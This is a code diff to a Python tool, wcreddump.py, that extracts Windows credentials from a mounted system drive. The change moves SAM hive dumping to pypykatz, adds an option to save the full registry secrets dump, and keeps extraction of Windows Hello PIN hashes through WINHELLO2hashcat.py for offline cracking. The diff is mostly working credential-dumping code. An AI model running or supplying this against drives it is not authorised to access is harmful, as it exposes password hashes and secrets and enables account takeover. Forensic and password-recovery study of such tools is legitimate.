@@ -3,7 +3,7 @@
 #
 #Requires the following conditions :
 # - To be run from a GNU/linux's terminal (python wcreddump.py)
-# - samdump2 on system (apt install samdump2)
+# - pypykatz installed on system (apt install pypykatz)
 # - python >=3.10 with the following libs installed : dpapick3, PyCryptodome (pip install dpapick3 PyCryptodome)
 # - WINHELLO2hashcat.py in the same directory as wcreddump.py (https://github.com/Banaanhangwagen/WINHELLO2hashcat)
 # - A mounted drive with a windows os on it
@@ -18,6 +18,9 @@ import os
 
 ### INIT ###
 autosave = True
+dumpInfos = False #will work only if autosave is on and mode 0 or 2 is used
+	
+outputDirectory = "/outputs/"
 scriptPath = os.path.dirname(__file__)
 disks = disk_partitions()
 
@@ -45,6 +48,8 @@ print()
 if not os.path.isdir(f"{C}/Windows/System32") :
 	print("error : selected drive is not a windows system drive")
 	exit()
+if autosave and not os.path.isdir(scriptPath+outputDirectory) :
+		os.makedirs(scriptPath+outputDirectory)
 
 ### ATTACK MODE SELECTION ###
 print("0 : dump SAM hive\n1 : dump WINHELLO\n2 : dump both if possible")
@@ -57,16 +62,20 @@ if mode == 0 or mode == 2 :
 	path = f"{C}/Windows/System32/config"
 	print(f"full path to SAM hive : \"{path}\"")
 	os.chdir(path)
-	sam = check_output("samdump2 SYSTEM SAM", shell=True).decode()
-	t = time()
-	print(sam)
+	raw = check_output("pypykatz registry --sam SAM --security SECURITY --software SOFTWARE SYSTEM", shell=True).decode()
+	sam = "\n".join(raw.split("============== SAM hive secrets ==============")[1].split("============== SECURITY hive secrets ==============")[0].split("\n")[2:])
+	t = round(time(), 2)
+	print("\n"+sam)
 	os.chdir(scriptPath)
 	if autosave :
-		if not os.path.isdir(scriptPath+"/outputs") :
-			os.makedirs(scriptPath+"/outputs")
-		with open(scriptPath+f"/outputs/SAM ({drives[driveID]})-{t}", "w") as f :
+		with open(scriptPath+f"{outputDirectory}SAM ({drives[driveID]})-{t}", "w") as f :
 			f.write(sam)
-	print(f"succesfully dumped SAM's hash.es to \"SAM ({drives[driveID]})-{t}\"\n")
+		print(f"succesfully dumped SAM's hash.es to \"SAM ({drives[driveID]})-{t}\"\n")
+		if dumpInfos :
+			with open(scriptPath+f"{outputDirectory}INFOS ({drives[driveID]})-{t}", "w") as f :
+				f.write(raw)
+			print(f"succesfully dumped OS infos to \"INFOS ({drives[driveID]})-{t}\"\n")
+	
 
 ### WINHELLO DUMPING ###
 if mode == 1 or mode == 2 :
@@ -80,12 +89,10 @@ if mode == 1 or mode == 2 :
 			ngc = f'--ngc "{C}/Windows/ServiceProfiles/LocalService/AppData/Local/Microsoft/Ngc/"'
 			try :
 				hashes = check_output(f"python WINHELLO2hashcat.py {cryptokeys} {masterkey} {system} {security} {ngc}", shell=True).decode()
-				t = time()
+				t = round(time(), 2)
 				print(hashes)
 				if autosave :
-					if not os.path.isdir(scriptPath+"/outputs") :
-						os.makedirs(scriptPath+"/outputs")
-					with open(scriptPath+f"/outputs/WINHELLO ({drives[driveID]})-{t}", "w") as f :
+					with open(scriptPath+f"{outputDirectory}WINHELLO ({drives[driveID]})-{t}", "w") as f :
 						f.write(hashes)
 				print(f"succesfully dumped WINHELLO pin.s to \"WINHELLO ({drives[driveID]})-{t}\"")
 			except :
